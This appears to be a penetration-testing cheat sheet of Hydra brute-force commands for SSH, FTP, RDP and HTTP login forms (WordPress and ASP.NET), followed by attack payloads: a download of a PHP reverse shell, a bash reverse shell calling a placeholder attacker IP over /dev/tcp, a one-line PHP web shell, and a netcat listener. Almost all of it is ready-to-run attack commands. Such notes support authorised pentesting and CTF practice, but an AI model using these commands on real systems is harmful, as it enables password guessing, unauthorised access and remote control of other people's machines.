# Gaining Access

## Brute Force with Hydra

### SSH

```bash
# Basic SSH brute force
hydra -t 16 -l <USERNAME> -P <WORDLIST> -vV <TARGET_IP> ssh

# With custom port
hydra -l <USERNAME> -P <WORDLIST> -s <PORT> <TARGET_IP> ssh -t 4 -V
```

### FTP

```bash
hydra -l <USERNAME> -P <WORDLIST> <TARGET_IP> ftp -s <PORT>
```

### HTTP

```bash
# Basic HTTP form
hydra -l <USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V

# WordPress login
hydra -l <USERNAME> -P <WORDLIST> <TARGET_IP> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

# Complex HTTP form (ASP.NET)
# Note: In real ASP.NET applications, you'll need to extract the actual VIEWSTATE and EVENTVALIDATION values
hydra -l <USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "/Account/login.aspx:__VIEWSTATE=AAAA...&__EVENTVALIDATION=BBBB...&ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Login Failed" -vv

# Full ASP.NET example (actual values from a real form)
# hydra -l <USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=cA0G9qdKx6zfVMbxRL4g7t9TdKArhtO4TD7XjxT4xiqh%2BCdpVmFJZyR5AWklhP%2BVmcY6nd3X7qd00FjX8Ba5lPIZZHizK7vJSohh0Ky7N53oZ%2BIycu85FyMhdorudRIJLTo0tE%2BaKMmoSfMlKAtRPRyxRFSbmlIX8KYOBjjMjcGHlNiB&__EVENTVALIDATION=oY9Jz98oobgM%2B1WwPvGjQqtuu921tBid%2BLM%2FLxAbKFW8N%2F7N2pJsP7HQWsRBLo4hBTB7hNbdYUYpHNKTvSOyD7N%2FvzDoeTHaibD2HBFJWqlMohA%2FpATOSqAwPSO18qS7r6vRerBVtB%2F23g8G0wn14sd1ez5r6fR7lPNqZomrDv%2FFH%2FY4&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
```

### RDP

```bash
hydra -t 1 -V -f -l <USERNAME> -P <WORDLIST> rdp://<TARGET_IP>
```

### General Syntax

```bash
# Basic
hydra -P <WORDLIST> -v <TARGET_IP> <protocol>

# With username list
hydra -v -V -u -L <USERNAME_LIST> -P <WORDLIST> -t 1 -u <TARGET_IP> <protocol>
```

## Reverse Shells

### PHP Reverse Shell

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
# Edit the IP and port in the file
```

### Bash Reverse Shell

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

### PHP Web Shell

```php
<?php system($_REQUEST["cmd"]); ?>
# Access via: http://<TARGET_IP>/cmd.phar?cmd=id
```

### Listener Setup

```bash
nc -lvnp 1234
```
